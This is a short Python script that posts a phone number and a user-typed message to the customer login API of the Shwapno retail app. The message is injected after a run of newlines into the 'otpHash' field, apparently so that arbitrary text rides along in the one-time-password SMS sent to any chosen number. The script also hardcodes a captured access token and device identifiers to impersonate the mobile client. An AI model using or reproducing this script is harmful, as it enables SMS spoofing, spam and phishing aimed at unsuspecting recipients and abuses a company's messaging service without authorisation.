import requests

n = input('Number  => ')
m = input('Message  => ')

url = "https://store-api.shwapno.com/en/api/customer/login"

data = {
    "phoneNumber": n,
    "otpHash": "\n\n\n\n\n" + m
}

headers = {
    "user-agent": "shwapno.flutter",
    "accept-encoding": "gzip",
    "nst": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOU1RfS0VZIjoiYm05d1UzUmhkR2x2YmxSdmEyVnUiLCJleHAiOjE3MjM5MTI1NTMsImlhdCI6MTcyMzgyNjE1M30.QGPgM5BvH0R2XBmbAEhPwxts0nZM1Ue8Tm8vmTdB7NE",
    "content-length": "52",
    "client-type": "App",
    "host": "store-api.shwapno.com",
    "content-type": "application/json",
    "customer": "f7f1ffa2-1200-48e5-9434-b55da46a8981",
    "device-type": "Mobile",
    "appdevicetoken": "f7f1ffa2-1200-48e5-9434-b55da46a8981"
}

response = requests.post(url, headers=headers, json=data)

print(response.text)